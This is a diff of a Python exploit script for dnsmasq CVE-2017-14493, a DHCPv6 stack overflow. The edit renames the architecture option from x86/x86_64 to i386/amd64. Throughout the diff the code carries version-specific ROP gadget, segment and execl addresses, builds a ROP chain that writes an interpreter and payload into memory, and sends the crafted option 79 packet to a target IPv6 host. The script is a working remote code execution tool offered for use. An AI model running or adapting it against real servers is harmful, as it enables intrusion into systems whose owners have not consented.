@@ -32,21 +32,21 @@ from sys import exit
 
 # NOP
 NOP = {
-    "x86": 0x90909090, 
-    "x86_64": 0x9090909090909090
+    "i386": 0x90909090, 
+    "amd64": 0x9090909090909090
 }
 
 
 # CRASH
 CRASH = {
-    "x86": 0x41414141,
-    "x86_64": 0x4141414141414141
+    "i386": 0x41414141,
+    "amd64": 0x4141414141414141
 }
 
 
 # JUNK
 JUNK = {
-    "x86": {
+    "i386": {
         "2.77": 36,
         "2.76": 24,
         "2.75": 24,
@@ -58,7 +58,7 @@ JUNK = {
 
 # Segment .text without ASLR
 TEXT = {
-    "x86": {
+    "i386": {
         "2.77": 0x0804a310,
         "2.76": 0x08049f10,
         "2.75": 0x08049ee0,
@@ -70,7 +70,7 @@ TEXT = {
 
 # Segment .data without ASLR
 DATA = {
-    "x86": {
+    "i386": {
         "2.77": 0x0808b220,
         "2.76": 0x08096240,
         "2.75": 0x08093240,
@@ -82,7 +82,7 @@ DATA = {
 
 # Execl address without ASLR
 EXECL = {
-    "x86": {
+    "i386": {
         "2.77": 0x08070758,
         "2.76": 0x0806c23c,
         "2.75": 0x0806c00e,
@@ -94,7 +94,7 @@ EXECL = {
 
 # ROP gadgets without ASLR
 ROP = {
-    "x86": {
+    "i386": {
         "2.77": {
             "pop eax": 0x08081617,  # pop eax; ret
             "pop ebx": 0x0804a392,  # pop ebx; pop ebp; ret
@@ -130,7 +130,7 @@ parser = ArgumentParser(description='Exploit for dnsmasq CVE-2017-14493 (Stack B
 
 parser.add_argument('-t', '--target', type=str, help='Set target IPv6 address', required=True)
 parser.add_argument('-p', '--target_port', type=int, help='Set target port, default=547', default=547)
-parser.add_argument('-c', '--capacity', help='Set capacity (x86 or x86_64), default=x86', default='x86')
+parser.add_argument('-a', '--architecture', help='Set architecture (i386 or amd64), default=i386', default='i386')
 parser.add_argument('-v', '--version', help='Set dnsmasq version (2.73, 2.74, 2.75, 2.76, 2.77),' +
                                             ' default=2.77', default='2.77')
 
@@ -151,11 +151,11 @@ args = parser.parse_args()
 host = str(args.target)
 port = int(args.target_port)
 
-capacity = ""
-if args.capacity == "x86" or args.capacity == "x86_64":
-    capacity = args.capacity
+architecture = ""
+if args.architecture == "i386" or args.architecture == "amd64":
+    architecture = args.architecture
 else:
-    print Base.c_error + "Bad capacity: " + args.capacity + " allow only x86 or x86_64!"
+    print Base.c_error + "Bad architecture: " + args.architecture + " allow only i386 or amd64!"
     exit(1)
 
 dnsmasq_version = ""
@@ -220,14 +220,14 @@ else:
 
 
 def send_packet(data, host, port):
-    print Base.c_info + "Capacity: " + capacity
+    print Base.c_info + "Architecture: " + architecture
     print Base.c_info + "Dnsmasq version: " + dnsmasq_version
     print Base.c_info + "Interpreter: " + interpreter
     print Base.c_info + "Interpreter arg: " + interpreter_arg
     print Base.c_info + "Payload: " + payload
-    print Base.c_info + "Address segment .text: " + str(TEXT[capacity][dnsmasq_version])
-    print Base.c_info + "Address segment .data: " + str(DATA[capacity][dnsmasq_version])
-    print Base.c_info + "Address execl function: " + str(EXECL[capacity][dnsmasq_version])
+    print Base.c_info + "Address segment .text: " + str(TEXT[architecture][dnsmasq_version])
+    print Base.c_info + "Address segment .data: " + str(DATA[architecture][dnsmasq_version])
+    print Base.c_info + "Address execl function: " + str(EXECL[architecture][dnsmasq_version])
 
     print Base.c_success + "Sending " + str(len(data)) + " bytes to " + str(host) + ":" + str(port)
     sock = socket(AF_INET6, SOCK_DGRAM, IPPROTO_UDP)
@@ -249,86 +249,86 @@ def gen_option(option, data, length=None):
 
 
 def add_string_in_data(addr_in_data, string):
-    c = capacity
+    a = architecture
     v = dnsmasq_version
     rop_chain = ""
 
-    if capacity == "x86":
+    if architecture == "i386":
         if len(string) % 4 == 0:
             string = string + "\x00" * 4
         else:
             string = string + "\x00" * (4 - (len(string) % 4))
 
-    if capacity == "x64":
+    if architecture == "amd64":
         if len(string) % 8 == 0:
             string = string + "\x00" * 8
         else:
             string = string + "\x00" * (8 - (len(string) % 8))
 
-    if capacity == "x86":
+    if architecture == "i386":
         if dnsmasq_version == "2.77":
             for x in range(0, len(string), 4):
-                rop_chain += Base.pack32(ROP[c][v]["pop eax"])  # pop eax; ret
+                rop_chain += Base.pack32(ROP[a][v]["pop eax"])  # pop eax; ret
                 rop_chain += Base.pack32(addr_in_data - 1 + x)  # address in .data - 1
-                rop_chain += Base.pack32(ROP[c][v]["pop ebx"])  # pop ebx; pop ebp; ret
+                rop_chain += Base.pack32(ROP[a][v]["pop ebx"])  # pop ebx; pop ebp; ret
                 rop_chain += string[x:x + 4]                    # 4 byte of string
-                rop_chain += Base.pack32(DATA[capacity][dnsmasq_version] + 28)  # address of .data + 28
-                rop_chain += Base.pack32(ROP[c][v]["mov"])      # mov [eax+0x1],ebx; add cl,cl; ret
+                rop_chain += Base.pack32(DATA[architecture][dnsmasq_version] + 28)  # address of .data + 28
+                rop_chain += Base.pack32(ROP[a][v]["mov"])      # mov [eax+0x1],ebx; add cl,cl; ret
 
         if dnsmasq_version == "2.76":
             for x in range(0, len(string), 4):
-                rop_chain += Base.pack32(ROP[c][v]["pop all"])  # pop eax ; pop ebx ; pop esi ; ret
+                rop_chain += Base.pack32(ROP[a][v]["pop all"])  # pop eax ; pop ebx ; pop esi ; ret
                 rop_chain += Base.pack32(addr_in_data + x)      # address in .data
                 rop_chain += string[x:x + 4]                    # 4 byte of string
-                rop_chain += Base.pack32(NOP[capacity])         # NOP (0x90909090) in esi
-                rop_chain += Base.pack32(ROP[c][v]["mov"])      # mov dword ptr [eax], ebx ; pop ebx ; pop esi ; ret
-                rop_chain += Base.pack32(NOP[capacity])         # NOP (0x90909090) in ebx
-                rop_chain += Base.pack32(NOP[capacity])         # NOP (0x90909090) in esi
+                rop_chain += Base.pack32(NOP[architecture])         # NOP (0x90909090) in esi
+                rop_chain += Base.pack32(ROP[a][v]["mov"])      # mov dword ptr [eax], ebx ; pop ebx ; pop esi ; ret
+                rop_chain += Base.pack32(NOP[architecture])         # NOP (0x90909090) in ebx
+                rop_chain += Base.pack32(NOP[architecture])         # NOP (0x90909090) in esi
 
         if dnsmasq_version == "2.75" or dnsmasq_version == "2.74" or dnsmasq_version == "2.73":
             for x in range(0, len(string), 4):
-                rop_chain += Base.pack32(ROP[c][v]["pop eax"])  # pop eax ; ret
+                rop_chain += Base.pack32(ROP[a][v]["pop eax"])  # pop eax ; ret
                 rop_chain += Base.pack32(addr_in_data + x)      # address in .data
-                rop_chain += Base.pack32(ROP[c][v]["pop ebx"])  # pop ebx ; ret
+                rop_chain += Base.pack32(ROP[a][v]["pop ebx"])  # pop ebx ; ret
                 rop_chain += string[x:x + 4]                    # 4 byte of string
-                rop_chain += Base.pack32(ROP[c][v]["mov"])      # mov dword ptr [eax], ebx ; pop ebx ; pop esi ; ret
-                rop_chain += Base.pack32(NOP[capacity])         # NOP (0x90909090) in ebx
-                rop_chain += Base.pack32(NOP[capacity])         # NOP (0x90909090) in esi
+                rop_chain += Base.pack32(ROP[a][v]["mov"])      # mov dword ptr [eax], ebx ; pop ebx ; pop esi ; ret
+                rop_chain += Base.pack32(NOP[architecture])         # NOP (0x90909090) in ebx
+                rop_chain += Base.pack32(NOP[architecture])         # NOP (0x90909090) in esi
 
     return rop_chain
 
 
 if __name__ == '__main__':
     option_79 = ""
-    if capacity == "x86":
+    if architecture == "i386":
 
-        interpreter_addr = DATA[capacity][dnsmasq_version]
+        interpreter_addr = DATA[architecture][dnsmasq_version]
         interpreter_arg_addr = interpreter_addr + len(interpreter) + (4 - (len(interpreter) % 4)) + 4
         payload_addr = interpreter_arg_addr + len(interpreter_arg) + (4 - (len(interpreter_arg) % 4)) + 4
 
         option_79 += Base.pack16(0)  # mac_type
 
-        option_79 += "0" * JUNK[capacity][dnsmasq_version]
+        option_79 += "0" * JUNK[architecture][dnsmasq_version]
 
-        option_79 += Base.pack32(NOP[capacity])  # EBX = 0x90909090
-        option_79 += Base.pack32(NOP[capacity])  # ESI = 0x90909090
-        option_79 += Base.pack32(NOP[capacity])  # EDI = 0x90909090
+        option_79 += Base.pack32(NOP[architecture])  # EBX = 0x90909090
+        option_79 += Base.pack32(NOP[architecture])  # ESI = 0x90909090
+        option_79 += Base.pack32(NOP[architecture])  # EDI = 0x90909090
 
         if dnsmasq_version == "2.77":
-            option_79 += Base.pack32(NOP[capacity])  # EBP = 0x90909090
+            option_79 += Base.pack32(NOP[architecture])  # EBP = 0x90909090
 
         option_79 += add_string_in_data(interpreter_addr, interpreter)
         option_79 += add_string_in_data(interpreter_arg_addr, interpreter_arg)
         option_79 += add_string_in_data(payload_addr, payload)
 
-        option_79 += Base.pack32(EXECL[capacity][dnsmasq_version])  # address of execl
-        option_79 += Base.pack32(interpreter_addr)                  # address of interpreter
-        option_79 += Base.pack32(interpreter_addr)                  # address of interpreter
-        option_79 += Base.pack32(interpreter_arg_addr)              # address of interpreter argument
-        option_79 += Base.pack32(payload_addr)                      # address of payload
+        option_79 += Base.pack32(EXECL[architecture][dnsmasq_version])  # address of execl
+        option_79 += Base.pack32(interpreter_addr)                      # address of interpreter
+        option_79 += Base.pack32(interpreter_addr)                      # address of interpreter
+        option_79 += Base.pack32(interpreter_arg_addr)                  # address of interpreter argument
+        option_79 += Base.pack32(payload_addr)                          # address of payload
 
     else:
-        print Base.c_error + "This capacity: " + capacity + " not yet supported!"
+        print Base.c_error + "This architecture: " + architecture + " not yet supported!"
         exit(1)
     
     pkg = b"".join([
